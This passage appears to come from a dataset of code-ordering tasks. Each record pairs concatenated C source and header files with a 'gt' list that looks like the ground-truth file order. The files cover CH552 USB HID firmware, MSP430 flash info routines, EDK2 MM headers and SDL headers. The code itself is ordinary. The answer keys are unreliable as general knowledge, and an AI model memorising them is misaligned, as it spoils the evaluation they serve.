EP0_BUF_SIZE)\n#define EP2_ADDR        (EP1_ADDR + EP1_BUF_SIZE)\n\n#define EP0_BUF_SIZE    EP_BUF_SIZE(EP0_SIZE)\n#define EP1_BUF_SIZE    EP_BUF_SIZE(EP1_SIZE)\n#define EP2_BUF_SIZE    EP_BUF_SIZE(EP2_SIZE)\n\n#define EP_BUF_SIZE(x)  (x+2<64 ? x+2 : 64)\n\n\n\n\ntypedef struct _USB_CFG_DESCR_HID {\n  USB_CFG_DESCR config;\n  USB_ITF_DESCR interface0;\n  USB_HID_DESCR hid0;\n  USB_ENDP_DESCR ep1IN;\n  USB_ENDP_DESCR ep2OUT;\n} USB_CFG_DESCR_HID, *PUSB_CFG_DESCR_HID;\ntypedef USB_CFG_DESCR_HID __xdata *PXUSB_CFG_DESCR_HID;\n\nextern __code USB_DEV_DESCR DevDescr;\nextern __code USB_CFG_DESCR_HID CfgDescr;\n\n\n\n\nextern __code uint8_t ReportDescr[];\nextern __code uint8_t ReportDescrLen;\n\n#define USB_REPORT_DESCR      ReportDescr\n#define USB_REPORT_DESCR_LEN  ReportDescrLen\n\n\n\n\nextern __code uint16_t LangDescr[];\nextern __code uint16_t ManufDescr[];\nextern __code uint16_t ProdDescr[];\nextern __code uint16_t SerDescr[];\nextern __code uint16_t InterfDescr[];\n\n#define USB_STR_DESCR_i0    (uint8_t*)LangDescr\n#define USB_STR_DESCR_i1    (uint8_t*)ManufDescr\n#define USB_STR_DESCR_i2    (uint8_t*)ProdDescr\n#define USB_STR_DESCR_i3    (uint8_t*)SerDescr\n#define USB_STR_DESCR_i4    (uint8_t*)InterfDescr\n#define USB_STR_DESCR_ix    (uint8_t*)SerDescr\n\n'CH552-MacroPad-plus/software/src/usb_handler.h'\n:\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb_descr.h\"\n\n\n\n\n__xdata __at (EP0_ADDR) uint8_t EP0_buffer[EP0_BUF_SIZE];\n__xdata __at (EP1_ADDR) uint8_t EP1_buffer[EP1_BUF_SIZE];\n__xdata __at (EP2_ADDR) uint8_t EP2_buffer[EP2_BUF_SIZE];\n\n#define USB_setupBuf ((PUSB_SETUP_REQ)EP0_buffer)\nextern uint8_t SetupReq;\n\n\n\n\nvoid HID_setup(void);\nvoid HID_reset(void);\nvoid HID_EP1_IN(void);\nvoid HID_EP2_OUT(void);\n\n\n\n\n\n#define USB_INIT_handler    HID_setup\n#define USB_RESET_handler   HID_reset\n\n\n#define EP0_SETUP_callback  USB_EP0_SETUP\n#define EP0_IN_callback     USB_EP0_IN\n#define EP0_OUT_callback    USB_EP0_OUT\n#define EP1_IN_callback     HID_EP1_IN\n#define EP2_OUT_callback    HID_EP2_OUT\n\n\n\n\nvoid USB_interrupt(void);\nvoid USB_init(void);\n\n'CH552-MacroPad-plus/software/src/usb_hid.h'\n:\n\n\n\n\n\n\n\n#pragma once\n\n#include <stdint.h>\n\n#include \"usb_handler.h\"\n\n\n\nvoid HID_init(void);\n\nvoid HID_sendReport(__xdata uint8_t* buf, uint8_t len);\n\n",
        "gt": [
            "'CH552-MacroPad-plus/software/src/config.h'",
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.c'"
        ]
    },
    {
        "files": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/oa.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'"
        ],
        "content": "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/oa.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __MSP430WARE_OA_H__\n\n#define __MSP430WARE_OA_H__\n\n\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#ifdef __MSP430_HAS_OA_0__\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\nextern \"C\"\n\n{\n\n#endif\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH0                                 PSW0\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH1                                 PSW1\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH2                                 PSW2\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCH3                                 PSW3\n\n#define OA_POSITIVE_INPUT_TERMINAL_NONE                                    0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH0                                 NSW0\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH1                                 NSW1\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH2                                 NSW2\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH3                                 NSW3\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCH4                                 NSW4\n\n#define OA_NEGATIVE_INPUT_TERMINAL_NONE                                    0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_GROUND_SWITCH0                                                  GSW0\n\n#define OA_GROUND_SWITCH1                                                  GSW1\n\n#define OA_GROUND_NONE                                                     0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_POSITIVE_INPUT_TERMINAL_SWITCHES                                0x00\n\n#define OA_NEGATIVE_INPUT_TERMINAL_SWITCHES                                0x01\n\n#define OA_GROUND_SWITCHES                                                 0x02\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_INPUT_READY                                                 OARRIRDY\n\n#define OA_INPUT_NOT_READY                                                 0x00\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_INPUT_ENABLED                                                  OARRI\n\n#define OA_INPUT_DISABLED                                                (0x00)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define OA_AMPLIFIER_MODE_ENABLED                                           OAM\n\n#define OA_AMPLIFIER_MODE_DISABLED                                       (0x00)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_openSwitch(uint16_t baseAddress,\n\n                          uint8_t positiveInputMask,\n\n                          uint8_t negativeInputMask,\n\n                          uint8_t groundMask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_closeSwitch(uint16_t baseAddress,\n\n                           uint8_t positiveInputMask,\n\n                           uint8_t negativeInputMask,\n\n                           uint8_t groundMask);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getSwitchStatus(uint16_t baseAddress,\n\n                                  uint8_t inputTerminal);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getRailToRailInputReadyStatus(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getRailToRailInputStatus(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_enableRailToRailInput(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_disableRailToRailInput(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_disableAmplifierMode(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern void OA_enableAmplifierMode(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nextern uint8_t OA_getAmplifierModeStatus(uint16_t baseAddress);\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifdef __cplusplus\n\n}\n\n#endif\n\n\n\n#endif\n\n#endif\n\n\n'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'\n:\n\n#include \"inc/hw_memmap.h\"\n\n\n\n#include \"sysctl.h\"\n\n#include \"dma.h\"\n\n#include \"eusci_b_i2c.h\"\n\n#include \"rtc_b.h\"\n\n#include \"crc.h\"\n\n#include \"usci_a_uart.h\"\n\n#include \"flashctl.h\"\n\n#include \"ram.h\"\n\n#include \"dac12_a.h\"\n\n#include \"pmap.h\"\n\n#include \"mpy32.h\"\n\n#include \"rtc_a.h\"\n\n#include \"ucs.h\"\n\n#include \"aes.h\"\n\n#include \"tec.h\"\n\n#include \"usci_a_spi.h\"\n\n#include \"sfr.h\"\n\n#include \"wdt_a.h\"\n\n#include \"timer_a.h\"\n\n#include \"oa.h\"\n\n#include \"pmm.h\"\n\n#include \"lcd_b.h\"\n\n#include \"rtc_c.h\"\n\n#include \"adc10_a.h\"\n\n#include \"eusci_a_uart.h\"\n\n#include \"ctsd16.h\"\n\n#include \"usci_b_spi.h\"\n\n#include \"comp_b.h\"\n\n#include \"gpio.h\"\n\n#include \"tlv.h\"\n\n#include \"ldopwr.h\"\n\n#include \"adc12_a.h\"\n\n#include \"ref.h\"\n\n#include \"eusci_a_spi.h\"\n\n#include \"timer_b.h\"\n\n#include \"battbak.h\"\n\n#include \"usci_b_i2c.h\"\n\n#include \"eusci_b_spi.h\"\n\n#include \"timer_d.h\"\n\n#include \"lcd_c.h\"\n\n#include \"sd24_b.h\"\n\n\n'KFDtool/fw/KFDtool/InfoData.c'\n:\n\n\n\n\n\n#include \"driverlib.h\"\n\n#include \"InfoData.h\"\n\n\n\n#define INFOB_START (0x1900)\n\n#define INFOB_LENGTH (128)\n\n\n\n#define INFOC_START (0x1880)\n\n#define INFOC_LENGTH (128)\n\n\n\nuint16_t idWriteModelIdHwRev(uint8_t hwId, uint8_t hwRevMaj, uint8_t hwRevMin)\n\n{\n\n    uint8_t data[5];\n\n\n\n    data[0] = 0x10;\n\n    data[1] = hwId;\n\n    data[2] = hwRevMaj;\n\n    data[3] = hwRevMin;\n\n    data[4] = 0x11;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOB_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOB_START, INFOB_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOB_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idWriteSerNum(uint8_t ser0, uint8_t ser1, uint8_t ser2, uint8_t ser3, uint8_t ser4, uint8_t ser5)\n\n{\n\n    uint8_t data[8];\n\n\n\n    data[0] = 0x20;\n\n    data[1] = ser0;\n\n    data[2] = ser1;\n\n    data[3] = ser2;\n\n    data[4] = ser3;\n\n    data[5] = ser4;\n\n    data[6] = ser5;\n\n    data[7] = 0x22;\n\n\n\n    uint16_t status;\n\n\n\n    do\n\n    {\n\n        FlashCtl_eraseSegment((uint8_t *)INFOC_START);\n\n        status = FlashCtl_performEraseCheck((uint8_t *)INFOC_START, INFOC_LENGTH);\n\n    } while (status == STATUS_FAIL);\n\n\n\n    FlashCtl_write8(data, (uint8_t *)INFOC_START, sizeof(data));\n\n\n\n    return 1;\n\n}\n\n\n\nuint16_t idReadModelId(uint8_t *hwId)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *hwId = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadHwRev(uint8_t *hwRevMaj, uint8_t *hwRevMin)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOB_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *flashPtr++;\n\n    *hwRevMaj = *flashPtr;\n\n    *hwRevMin = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = *flashPtr;\n\n\n\n    if (header == 0x10 && footer == 0x11)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n\n\nuint16_t idReadSerNum(uint8_t *ser0, uint8_t *ser1, uint8_t *ser2, uint8_t *ser3, uint8_t *ser4, uint8_t *ser5)\n\n{\n\n    uint16_t *flashPtr;\n\n\n\n    flashPtr = (uint16_t *)INFOC_START;\n\n\n\n    uint8_t header;\n\n    uint8_t footer;\n\n\n\n    header = *flashPtr;\n\n    *ser0 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser1 = *flashPtr;\n\n    *ser2 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    *ser3 = *flashPtr;\n\n    *ser4 = (*flashPtr >> 8);\n\n    *flashPtr++;\n\n    footer = (*flashPtr >> 8);\n\n    *ser5 = *flashPtr;\n\n\n\n    if (header == 0x20 && footer == 0x22)\n\n    {\n\n        return 1;\n\n    }\n\n    else\n\n    {\n\n        return 0;\n\n    }\n\n}\n\n",
        "gt": [
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/oa.h'",
            "'KFDtool/fw/KFDtool/driverlib/MSP430F5xx_6xx/driverlib.h'",
            "'KFDtool/fw/KFDtool/InfoData.c'"
        ]
    },
    {
        "files": [
            "'efi-monitor/edk2/MdePkg/Include/Pi/PiMultiPhase.h'",
            "'efi-monitor/edk2/MdePkg/Include/PiMm.h'",
            "'efi-monitor/edk2/MdePkg/Include/Pi/PiBootMode.h'",
            "'efi-monitor/edk2/MdePkg/Include/Pi/PiMmCis.h'",
            "'efi-monitor/edk2/MdePkg/Include/Library/MmServicesTableLib.h'"
        ],
        "content": "'efi-monitor/edk2/MdePkg/Include/Pi/PiMultiPhase.h'\n:\n\n#ifndef __PI_MULTIPHASE_H__\n#define __PI_MULTIPHASE_H__\n\n#include <Pi/PiFirmwareVolume.h>\n#include <Pi/PiFirmwareFile.h>\n#include <Pi/PiBootMode.h>\n#include <Pi/PiHob.h>\n#include <Pi/PiDependency.h>\n#include <Pi/PiStatusCode.h>\n#include <Pi/PiS3BootScript.h>\n\n\n#define DXE_ERROR(StatusCode)  (MAX_BIT | (MAX_BIT >> 2) | StatusCode)\n\n\n\n\n#define EFI_REQUEST_UNLOAD_IMAGE  DXE_ERROR (1)\n\n\n\n\n\n#define EFI_NOT_AVAILABLE_YET     DXE_ERROR (2)\n\n\n\n\n\n\n#define PI_ENCODE_WARNING(a)                ((MAX_BIT >> 2) | (a))\n\n\n\n\n\n\n#define PI_ENCODE_ERROR(a)                  (MAX_BIT | (MAX_BIT >> 2) | (a))\n\n\n\n\n#define EFI_INTERRUPT_PENDING               PI_ENCODE_ERROR (0)\n\n#define EFI_WARN_INTERRUPT_SOURCE_PENDING   PI_ENCODE_WARNING (0)\n#define EFI_WARN_INTERRUPT_SOURCE_QUIESCED  PI_ENCODE_WARNING (1)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define EFI_AUTH_STATUS_PLATFORM_OVERRIDE   0x01\n#define EFI_AUTH_STATUS_IMAGE_SIGNED        0x02\n#define EFI_AUTH_STATUS_NOT_TESTED          0x04\n#define EFI_AUTH_STATUS_TEST_FAILED         0x08\n#define EFI_AUTH_STATUS_ALL                 0x0f\n\n\n\n\n\n#define EFI_MMRAM_OPEN                  0x00000001\n#define EFI_MMRAM_CLOSED                0x00000002\n#define EFI_MMRAM_LOCKED                0x00000004\n#define EFI_CACHEABLE                   0x00000008\n#define EFI_ALLOCATED                   0x00000010\n#define EFI_NEEDS_TESTING               0x00000020\n#define EFI_NEEDS_ECC_INITIALIZATION    0x00000040\n\n#define EFI_SMRAM_OPEN                  EFI_MMRAM_OPEN\n#define EFI_SMRAM_CLOSED                EFI_MMRAM_CLOSED\n#define EFI_SMRAM_LOCKED                EFI_MMRAM_LOCKED\n\n\n\n\ntypedef struct {\n\n\n\n\n\n  EFI_PHYSICAL_ADDRESS  PhysicalStart;\n\n\n\n\n  EFI_PHYSICAL_ADDRESS  CpuStart;\n\n\n\n  UINT64                PhysicalSize;\n\n\n\n\n\n\n  UINT64                RegionState;\n} EFI_MMRAM_DESCRIPTOR;\n\ntypedef EFI_MMRAM_DESCRIPTOR  EFI_SMRAM_DESCRIPTOR;\n\ntypedef enum {\n  EFI_PCD_TYPE_8,\n  EFI_PCD_TYPE_16,\n  EFI_PCD_TYPE_32,\n  EFI_PCD_TYPE_64,\n  EFI_PCD_TYPE_BOOL,\n  EFI_PCD_TYPE_PTR\n} EFI_PCD_TYPE;\n\ntypedef struct {\n\n\n\n\n  EFI_PCD_TYPE      PcdType;\n\n\n\n\n  UINTN             PcdSize;\n\n\n\n\n\n\n  CHAR8             *PcdName;\n} EFI_PCD_INFO;\n\n\ntypedef\nVOID\n(EFIAPI *EFI_AP_PROCEDURE)(\n  IN OUT VOID  *Buffer\n  );\n\n#endif\n\n'efi-monitor/edk2/MdePkg/Include/PiMm.h'\n:\n\n#ifndef __PI_MM_H__\n#define __PI_MM_H__\n\n#include <Uefi/UefiBaseType.h>\n#include <Uefi/UefiSpec.h>\n\n#include <Pi/PiMmCis.h>\n\n#endif\n\n\n'efi-monitor/edk2/MdePkg/Include/Pi/PiBootMode.h'\n:\n\n#ifndef __PI_BOOT_MODE_H__\n#define __PI_BOOT_MODE_H__\n\n\n\n\ntypedef UINT32  EFI_BOOT_MODE;\n\n\n\n\n#define BOOT_WITH_FULL_CONFIGURATION                  0x00\n#define BOOT_WITH_MINIMAL_CONFIGURATION               0x01\n#define BOOT_ASSUMING_NO_CONFIGURATION_CHANGES        0x02\n#define BOOT_WITH_FULL_CONFIGURATION_PLUS_DIAGNOSTICS 0x03\n#define BOOT_WITH_DEFAULT_SETTINGS                    0x04\n#define BOOT_ON_S4_RESUME                             0x05\n#define BOOT_ON_S5_RESUME                             0x06\n#define BOOT_WITH_MFG_MODE_SETTINGS                   0x07\n#define BOOT_ON_S2_RESUME                             0x10\n#define BOOT_ON_S3_RESUME                             0x11\n#define BOOT_ON_FLASH_UPDATE                          0x12\n#define BOOT_IN_RECOVERY_MODE                         0x20\n\n#endif\n\n'efi-monitor/edk2/MdePkg/Include/Pi/PiMmCis.h'\n:\n\n#ifndef _PI_MMCIS_H_\n#define _PI_MMCIS_H_\n\n#include <Pi/PiMultiPhase.h>\n#include <Protocol/MmCpuIo.h>\n\ntypedef struct _EFI_MM_SYSTEM_TABLE  EFI_MM_SYSTEM_TABLE;\n\n\n\n\n#define MM_MMST_SIGNATURE            SIGNATURE_32 ('S', 'M', 'S', 'T')\n\n\n\n#define MM_SPECIFICATION_MAJOR_REVISION  1\n#define MM_SPECIFICATION_MINOR_REVISION  60\n#define EFI_MM_SYSTEM_TABLE_REVISION    ((MM_SPECIFICATION_MAJOR_REVISION<<16) | (MM_SPECIFICATION_MINOR_REVISION))\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_INSTALL_CONFIGURATION_TABLE)(\n  IN CONST EFI_MM_SYSTEM_TABLE    *SystemTable,\n  IN CONST EFI_GUID               *Guid,\n  IN VOID                         *Table,\n  IN UINTN                        TableSize\n  );\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_STARTUP_THIS_AP)(\n  IN EFI_AP_PROCEDURE  Procedure,\n  IN UINTN             CpuNumber,\n  IN OUT VOID          *ProcArguments OPTIONAL\n  );\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_NOTIFY_FN)(\n  IN CONST EFI_GUID  *Protocol,\n  IN VOID            *Interface,\n  IN EFI_HANDLE      Handle\n  );\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_REGISTER_PROTOCOL_NOTIFY)(\n  IN  CONST EFI_GUID     *Protocol,\n  IN  EFI_MM_NOTIFY_FN   Function,\n  OUT VOID               **Registration\n  );\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_INTERRUPT_MANAGE)(\n  IN CONST EFI_GUID  *HandlerType,\n  IN CONST VOID      *Context         OPTIONAL,\n  IN OUT VOID        *CommBuffer      OPTIONAL,\n  IN OUT UINTN       *CommBufferSize  OPTIONAL\n  );\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_HANDLER_ENTRY_POINT)(\n  IN EFI_HANDLE  DispatchHandle,\n  IN CONST VOID  *Context         OPTIONAL,\n  IN OUT VOID    *CommBuffer      OPTIONAL,\n  IN OUT UINTN   *CommBufferSize  OPTIONAL\n  );\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_INTERRUPT_REGISTER)(\n  IN  EFI_MM_HANDLER_ENTRY_POINT    Handler,\n  IN  CONST EFI_GUID                *HandlerType OPTIONAL,\n  OUT EFI_HANDLE                    *DispatchHandle\n  );\n\n\ntypedef\nEFI_STATUS\n(EFIAPI *EFI_MM_INTERRUPT_UNREGISTER)(\n  IN EFI_HANDLE  DispatchHandle\n  );\n\n\n\n\ntypedef struct _EFI_MM_ENTRY_CONTEXT {\n  EFI_MM_STARTUP_THIS_AP   MmStartupThisAp;\n\n\n\n\n  UINTN                    CurrentlyExecutingCpu;\n\n\n\n\n  UINTN                    NumberOfCpus;\n\n\n\n\n\n  UINTN                    *CpuSaveStateSize;\n\n\n\n\n\n  VOID                     **CpuSaveState;\n} EFI_MM_ENTRY_CONTEXT;\n\n\ntypedef\nVOID\n(EFIAPI *EFI_MM_ENTRY_POINT)(\n  IN CONST EFI_MM_ENTRY_CONTEXT  *MmEntryContext\n  );\n\n\n\n\n\n\n\n\nstruct _EFI_MM_SYSTEM_TABLE {\n\n\n\n  EFI_TABLE_HEADER                     Hdr;\n\n\n\n\n  CHAR16                               *MmFirmwareVendor;\n\n\n\n  UINT32                               MmFirmwareRevision;\n\n  EFI_MM_INSTALL_CONFIGURATION_TABLE   MmInstallConfigurationTable;\n\n\n\n\n  EFI_MM_CPU_IO_PROTOCOL               MmIo;\n\n\n\n\n  EFI_ALLOCATE_POOL                    MmAllocatePool;\n  EFI_FREE_POOL                        MmFreePool;\n  EFI_ALLOCATE_PAGES                   MmAllocatePages;\n  EFI_FREE_PAGES                       MmFreePages;\n\n\n\n\n  EFI_MM_STARTUP_THIS_AP               MmStartupThisAp;\n\n\n\n\n\n\n\n\n\n  UINTN                                CurrentlyExecutingCpu;\n\n\n\n  UINTN                                NumberOfCpus;\n\n\n\n\n\n  UINTN                                *CpuSaveStateSize;\n\n\n\n\n\n  VOID                                 **CpuSaveState;\n\n\n\n\n\n\n\n\n  UINTN                                NumberOfTableEntries;\n\n\n\n\n  EFI_CONFIGURATION_TABLE              *MmConfigurationTable;\n\n\n\n\n  EFI_INSTALL_PROTOCOL_INTERFACE       MmInstallProtocolInterface;\n  EFI_UNINSTALL_PROTOCOL_INTERFACE     MmUninstallProtocolInterface;\n  EFI_HANDLE_PROTOCOL                  MmHandleProtocol;\n  EFI_MM_REGISTER_PROTOCOL_NOTIFY      MmRegisterProtocolNotify;\n  EFI_LOCATE_HANDLE                    MmLocateHandle;\n  EFI_LOCATE_PROTOCOL                  MmLocateProtocol;\n\n\n\n\n  EFI_MM_INTERRUPT_MANAGE              MmiManage;\n  EFI_MM_INTERRUPT_REGISTER            MmiHandlerRegister;\n  EFI_MM_INTERRUPT_UNREGISTER          MmiHandlerUnRegister;\n};\n\n#endif\n\n'efi-monitor/edk2/MdePkg/Include/Library/MmServicesTableLib.h'\n:\n\n#ifndef __MM_SERVICES_TABLE_LIB_H__\n#define __MM_SERVICES_TABLE_LIB_H__\n\n#include <PiMm.h>\n\nextern EFI_MM_SYSTEM_TABLE         *gMmst;\n\n#endif\n",
        "gt": [
            "'efi-monitor/edk2/MdePkg/Include/Pi/PiBootMode.h'",
            "'efi-monitor/edk2/MdePkg/Include/Pi/PiMultiPhase.h'",
            "'efi-monitor/edk2/MdePkg/Include/Pi/PiMmCis.h'",
            "'efi-monitor/edk2/MdePkg/Include/PiMm.h'",
            "'efi-monitor/edk2/MdePkg/Include/Library/MmServicesTableLib.h'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'\n:\n\n\n\n#ifndef _SDL_system_h\n#define _SDL_system_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_keyboard.h\"\n#include \"SDL_render.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n#ifdef __WIN32__\n\n\ntypedef void (SDLCALL * SDL_WindowsMessageHook)(void *userdata, void *hWnd, unsigned int message, Uint64 wParam, Sint64 lParam);\nextern DECLSPEC void SDLCALL SDL_SetWindowsMessageHook(SDL_WindowsMessageHook callback, void *userdata);\n\n\nextern DECLSPEC int SDLCALL SDL_Direct3D9GetAdapterIndex( int displayIndex );\n\ntypedef struct IDirect3DDevice9 IDirect3DDevice9;\n\nextern DECLSPEC IDirect3DDevice9* SDLCALL SDL_RenderGetD3D9Device(SDL_Renderer * renderer);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_DXGIGetOutputInfo( int displayIndex, int *adapterIndex, int *outputIndex );\n\n#endif\n\n\n\n#if defined(__IPHONEOS__) && __IPHONEOS__\n\n#define SDL_iOSSetAnimationCallback(window, interval, callback, callbackParam) SDL_iPhoneSetAnimationCallback(window, interval, callback, callbackParam)\nextern DECLSPEC int SDLCALL SDL_iPhoneSetAnimationCallback(SDL_Window * window, int interval, void (*callback)(void*), void *callbackParam);\n\n#define SDL_iOSSetEventPump(enabled) SDL_iPhoneSetEventPump(enabled)\nextern DECLSPEC void SDLCALL SDL_iPhoneSetEventPump(SDL_bool enabled);\n\n#endif\n\n\n\n#if defined(__ANDROID__) && __ANDROID__\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetJNIEnv();\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetActivity();\n\n\n#define SDL_ANDROID_EXTERNAL_STORAGE_READ   0x01\n#define SDL_ANDROID_EXTERNAL_STORAGE_WRITE  0x02\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetInternalStoragePath();\n\n\nextern DECLSPEC int SDLCALL SDL_AndroidGetExternalStorageState();\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetExternalStoragePath();\n\n#endif\n\n\n#if defined(__WINRT__) && __WINRT__\n\n\ntypedef enum\n{\n\n    SDL_WINRT_PATH_INSTALLED_LOCATION,\n\n\n    SDL_WINRT_PATH_LOCAL_FOLDER,\n\n\n    SDL_WINRT_PATH_ROAMING_FOLDER,\n\n\n    SDL_WINRT_PATH_TEMP_FOLDER\n} SDL_WinRT_Path;\n\n\n\nextern DECLSPEC const wchar_t * SDLCALL SDL_WinRTGetFSPathUNICODE(SDL_WinRT_Path pathType);\n\n\nextern DECLSPEC const char * SDLCALL SDL_WinRTGetFSPathUTF8(SDL_WinRT_Path pathType);\n\n#endif\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include 